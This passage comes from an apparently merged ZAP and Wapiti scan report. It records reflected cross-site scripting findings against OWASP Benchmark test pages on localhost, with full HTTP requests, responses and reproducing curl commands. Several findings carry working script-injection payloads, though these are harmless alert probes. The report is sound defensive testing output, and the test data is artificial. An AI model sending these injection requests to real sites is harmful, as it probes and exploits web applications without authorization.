              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02598"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02598?BenchmarkTest02598=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02598.html?BenchmarkTest02598=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02598?username=alice&password=Letm3in_&BenchmarkTest02598=%3CScRiPt%3Ealert%28%27w8j39p9h0p%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '27', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:15 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '37', 'date': 'Sun, 31 Aug 2025 04:22:17 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w8j39p9h0p')</sCrIpT>\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-05/BenchmarkTest02600?BenchmarkTest02600=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-05/BenchmarkTest02600?username=alice&password=Letm3in_&BenchmarkTest02600=%3CScRiPt%3Ealert%28%27wxooz2dymh%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wxooz2dymh')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wxooz2dymh')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02600?username=alice&password=Letm3in_&BenchmarkTest02600=%3CScRiPt%3Ealert%28%27wxooz2dymh%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02600.html?BenchmarkTest02600=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02600"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02600?BenchmarkTest02600=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02600.html?BenchmarkTest02600=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02600?username=alice&password=Letm3in_&BenchmarkTest02600=%3CScRiPt%3Ealert%28%27wxooz2dymh%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:15 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:22:18 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wxooz2dymh')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-05/BenchmarkTest02608?BenchmarkTest02608=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-05/BenchmarkTest02608?username=alice&password=Letm3in_&BenchmarkTest02608=%3CScRiPt%3Ealert%28%27wiunj01rod%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wiunj01rod')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wiunj01rod')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02608?username=alice&password=Letm3in_&BenchmarkTest02608=%3CScRiPt%3Ealert%28%27wiunj01rod%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02608.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02608"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02608?BenchmarkTest02608=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02608.html?BenchmarkTest02608=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02608?username=alice&password=Letm3in_&BenchmarkTest02608=%3CScRiPt%3Ealert%28%27wiunj01rod%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '43', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:15 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Parameter value: <scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '53', 'date': 'Sun, 31 Aug 2025 04:22:19 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Parameter value: <ScRiPt>alert('wiunj01rod')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00030",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00030?BenchmarkTest00030=%3CScRiPt%3Ealert%28%27w9zww58mbz%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w9zww58mbz')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w9zww58mbz')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00030\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00030.html\" -d \"BenchmarkTest00030=%3CScRiPt%3Ealert%28%27w9zww58mbz%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00030"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00030', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '61', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00030.html?BenchmarkTest00030=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAwMDMwPSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00030', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00030.html', 'content-length': '73', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest00030=%3CScRiPt%3Ealert%28%27w9zww58mbz%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:50 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:22:21 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w9zww58mbz')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00375",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00375?BenchmarkTest00375=SafeText&BenchmarkTest00375=Movies&BenchmarkTest00375=Writing&BenchmarkTest00375=%3CScRiPt%3Ealert%28%27wgqc0thxk1%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wgqc0thxk1')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wgqc0thxk1')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00375\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00375.html?BenchmarkTest00375=SafeText\" -d \"BenchmarkTest00375=SafeText&BenchmarkTest00375=Movies&BenchmarkTest00375=Writing&BenchmarkTest00375=%3CScRiPt%3Ealert%28%27wgqc0thxk1%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00375"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00375', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00375.html?BenchmarkTest00375=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAwMzc1PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00375', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00375.html?BenchmarkTest00375=SafeText', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest00375=SafeText&BenchmarkTest00375=Movies&BenchmarkTest00375=Writing&BenchmarkTest00375=%3CScRiPt%3Ealert%28%27wgqc0thxk1%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:51 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
